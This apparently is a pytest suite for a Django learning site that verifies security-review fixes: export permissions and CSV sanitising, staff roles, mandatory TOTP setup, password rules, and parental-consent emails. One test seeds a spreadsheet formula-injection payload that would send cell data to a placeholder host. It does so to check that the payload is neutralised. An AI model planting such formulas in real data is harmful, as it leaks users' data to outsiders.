"""Security review fixes for accounts and staff (SECURITY_REVIEW.md): exports, roles, MFA, parental consent,
passwords."""

import re
import time
from datetime import date
from io import StringIO

import pytest
from allauth.account.models import EmailAddress
from allauth.mfa.totp.internal.auth import TOTP, format_hotp_value, generate_totp_secret, hotp_value
from django.contrib import admin
from django.contrib.admin.models import LogEntry
from django.contrib.auth.password_validation import validate_password
from django.core import mail
from django.core.exceptions import PermissionDenied, ValidationError
from django.core.management import call_command
from django.test import Client
from django.urls import reverse
from import_export.formats.base_formats import CSV
from pwned_passwords_django import api as pwned_passwords

from accounts import roles
from accounts.factories import PASSWORD, UserFactory
from accounts.models import STAFF_SESSION, ConsentRecord, User
from accounts.test_roles import member
from accounts.tests import birthday
from api.test_headless import BROWSER, pending
from content.models import Board
from content.tests import make_paper
from practice.models import Attempt

pytestmark = pytest.mark.django_db


def test_only_the_admin_role_exports_and_each_export_is_logged(rf):  # M5, L7
    call_command("bootstrap_roles", stdout=StringIO())
    UserFactory(full_name='=HYPERLINK("https://x.example/?"&B2,"Open")', date_of_birth=date(2010, 5, 14))
    request = rf.get("/admin/accounts/user/export/")
    request.user = member(roles.SUPPORT, roles.SALES, is_staff=True)
    for model in (User, ConsentRecord, Attempt):
        assert not admin.site._registry[model].has_export_permission(request), model
    with pytest.raises(PermissionDenied):
        admin.site._registry[User].get_export_data(CSV(), request, User.objects.all())
    request.user = member(roles.ADMIN, is_staff=True)
    for model in (User, ConsentRecord, Attempt):
        assert admin.site._registry[model].has_export_permission(request), model
    csv = admin.site._registry[User].get_export_data(CSV(), request, User.objects.all())
    assert "date_of_birth" not in csv and "2010-05-14" not in csv and "parent_contact" not in csv
    assert '"HYPERLINK(' in csv and "=HYPERLINK" not in csv  # no formula for the spreadsheet
    entry = LogEntry.objects.get()
    assert (entry.user, entry.object_repr) == (request.user, "Export of 3 users")


def test_periodic_tasks_and_who_may_do_what_are_left_to_superusers(client):  # I7
    call_command("bootstrap_roles", stdout=StringIO())
    manager = member(roles.ADMIN, is_staff=True)
    assert manager.has_perms(["accounts.change_user", "django_celery_beat.view_periodictask", "auth.view_group"])
    for perm in [
        "django_celery_beat.change_periodictask",
        "django_celery_beat.add_periodictask",
        "django_celery_results.delete_taskresult",
        "auth.change_group",
        "auth.change_permission",
    ]:
        assert not manager.has_perm(perm), perm
    client.force_login(manager)
    page = client.get(reverse("admin:accounts_user_change", args=[UserFactory().pk]))
    assert page.status_code == 200 and 'name="is_superuser"' not in page.text and 'name="groups"' not in page.text
    superuser = UserFactory(is_staff=True, is_superuser=True)
    assert client.get(reverse("admin:auth_user_password_change", args=[superuser.pk])).status_code == 403


def test_staff_must_set_up_an_authenticator_app_before_anything_else(client, settings):  # H2
    staff = UserFactory(is_staff=True, is_superuser=True, totp=False)
    client.force_login(staff)
    for url in [reverse("admin:index"), reverse("learn:preview", args=[1])]:
        response = client.get(url)
        assert (response.status_code, response["Location"]) == (302, f"{settings.SITE_URL}/account/2fa/"), url
    response = client.get("/api/v1/me/")  # the API answers in JSON
    assert (response.status_code, response.json()["code"]) == (403, "mfa_setup_required")
    setup = client.get(BROWSER + "/account/authenticators/totp")  # the website's set-up: open, with its secret
    assert setup.status_code == 404 and setup.json()["meta"]["secret"]
    assert client.get("/static/css/staff.css").status_code != 302  # static files are not held back
    TOTP.activate(staff, generate_totp_secret())
    assert client.get(reverse("admin:index")).status_code == 200
    client.force_login(UserFactory())  # students are not asked
    assert client.get("/api/v1/me/").status_code == 200


def test_the_admin_login_is_the_websites_with_the_code_and_staff_sessions_last_8_hours(client, settings):  # H2
    settings.MFA_TOTP_TOLERANCE = 1  # a code of the previous or next 30 seconds too: no failure at a boundary
    staff, secret = UserFactory(is_staff=True, totp=False), generate_totp_secret()
    EmailAddress.objects.create(user=staff, email=staff.email, verified=True, primary=True)
    TOTP.activate(staff, secret)
    response = client.get(reverse("admin:login"), {"next": "/admin/"})
    assert response["Location"] == settings.LOGIN_URL + "?next=%2Fadmin%2F"  # the website's log-in page
    response = client.post(BROWSER + "/auth/login", {"email": staff.email, "password": PASSWORD}, "application/json")
    assert response.status_code == 401 and pending(response) == ["mfa_authenticate"]  # the password is not enough
    assert "_auth_user_id" not in client.session
    code = format_hotp_value(hotp_value(secret, int(time.time()) // 30))
    response = client.post(BROWSER + "/auth/2fa/authenticate", {"code": code}, "application/json")
    assert response.status_code == 200 and client.get("/admin/").status_code == 200
    assert STAFF_SESSION.total_seconds() - 60 < client.session.get_expiry_age() <= STAFF_SESSION.total_seconds()


def test_passwords_need_10_characters_and_no_breach_and_reset_links_last_an_hour(settings, monkeypatch):  # L11
    assert settings.PASSWORD_RESET_TIMEOUT == 3600
    breached = "Kaziranga-2028"
    monkeypatch.setattr(pwned_passwords.default_client, "check_password", lambda password: 3 * (password == breached))
    for password, error in [("Assam-27x", "at least 10 characters"), (breached, "too common")]:
        with pytest.raises(ValidationError, match=error):
            validate_password(password)
    validate_password("Brahmaputra-2027")


def sign_up(client, **fields):
    """The website's sign-up (allauth.headless, the browser client): a student of 16 with a parent's details."""
    data = {
        **{"full_name": "Rahul Das", "email": "rahul@example.com", "password": PASSWORD},
        **{"class_level": 12, "board": Board.objects.get().pk, "date_of_birth": birthday(16).isoformat()},
        **{"parent_name": "Anita Das", "consent": True, **fields},
    }
    return client.post(BROWSER + "/auth/signup", data, "application/json")


def errors(response):
    return {error["param"] for error in response.json()["errors"]}


def parent_link(to):
    """The website's page in the parent's email, /c/<token>/."""
    [body] = [m.body for m in mail.outbox if m.to == [to]][-1:]
    return re.search(r"/c/[^/\s]+/", body).group()


def api_link(page):
    """What the website's page /c/<token>/ asks the API (api/parent_link.py)."""
    return page.replace("/c/", "/api/v1/parent-consent/", 1)


def confirm_own_address(client, email="rahul@example.com"):
    """The code emailed to the student at the sign-up, typed where the website asks for it (the parent's link goes
    only after this: SECURITY_REVIEW_PHASE5_6.md M3)."""
    [body] = [m.body for m in mail.outbox if m.to == [email]][-1:]
    code = re.search(r"^(\d{6})$", body, re.M).group(1)
    return client.post(BROWSER + "/auth/email/verify", {"key": code}, "application/json")


def test_verified_mode_marks_wait_for_the_parents_emailed_consent(client, settings, monkeypatch):  # M9
    settings.PARENTAL_CONSENT_MODE = "verified"
    paper = make_paper()
    refused = sign_up(client, parent_contact="+44 20 7946 0958")
    assert errors(refused) == {"parent_contact"}  # no link to a landline or a number abroad (SMS: test_parent_sms.py)
    sign_up(client, parent_contact="Anita@Example.com")
    user = User.objects.get()
    assert user.consent_pending and ConsentRecord.objects.get().method == ConsentRecord.Method.DECLARED
    assert not [m for m in mail.outbox if m.to == ["anita@example.com"]]  # not before the student's own address
    assert confirm_own_address(client).status_code == 200  # and the student is logged in
    first_link = parent_link("anita@example.com")
    attempt = {"paper": paper.code, "date": "2026-10-01", "marks_obtained": "40"}
    response = client.post("/api/v1/attempts/", attempt, "application/json")
    assert "has not confirmed your account yet" in response.text and not Attempt.objects.exists()
    assert client.get("/api/v1/me/").json()["consent_pending"] is True  # My account: "Waiting for your parent"
    resend = "/api/v1/me/parent-consent/"
    assert client.post(resend, {"parent_contact": "rahul@example.com"}, "application/json").status_code == 400
    client.post(resend, {"parent_contact": "father@example.com"}, "application/json")  # a corrected address
    parent, link = Client(), parent_link("father@example.com")
    replaced = parent.get(api_link(first_link))
    assert replaced.status_code == 400 and replaced.json()["status"] == "expired"  # the old address's
    later = time.time() + 8 * 86400
    with monkeypatch.context() as m:
        m.setattr(time, "time", lambda: later)
        expired = parent.get(api_link(link))  # 7 days: a genuine link, so the page names the student
        assert expired.status_code == 400 and expired.json()["first_name"] == "Rahul"
    page = parent.get(api_link(link)).json()
    assert (page["status"], page["student_name"]) == ("pending", "Rahul Das")
    assert not ConsentRecord.objects.filter(by_parent=True, verified_at__isnull=False).exists()
    assert parent.post(api_link(link)).json()["status"] == "confirmed"  # "I agree"
    record = ConsentRecord.objects.get(method=ConsentRecord.Method.EMAIL_LINK)
    assert record.by_parent and record.verified_at and not User.objects.get().consent_pending
    response = client.post("/api/v1/attempts/", attempt, "application/json")
    assert response.status_code == 201 and Attempt.objects.exists()
